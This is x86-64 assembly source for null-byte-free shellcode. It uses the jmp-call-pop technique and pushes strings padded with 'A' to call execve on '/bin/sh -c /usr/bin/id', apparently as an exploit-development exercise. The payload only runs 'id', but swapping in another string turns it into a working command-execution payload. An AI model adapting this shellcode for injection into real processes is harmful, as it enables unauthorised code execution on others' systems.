 section .text
    global _start

_start:

    xor rdx, rdx ; envp

    mov rax, 'A/bin/sh'
    shr rax, 0x08
    push rax
    mov rax, rsp
    
    mov rcx, 'AAAAAA-c'
    shr rcx, 0x30
    push rcx
    mov rcx, rsp

    ;mov rbx, 'AAAAAAid'
    ;shr rbx, 0x30
    ;push rbx
    ;mov rbx, rsp

    ; ==============

    jmp short cmd
    continue:
    pop rbx

    ;=============== 


    push rdx ; NULL
    push rbx
    push rcx
    push rax

    mov rdi, rax ; filename
    mov rsi, rsp ; argv

    xor rax, rax
    mov al, 0x3b
    syscall

cmd:
    call continue
    db "/usr/bin/id"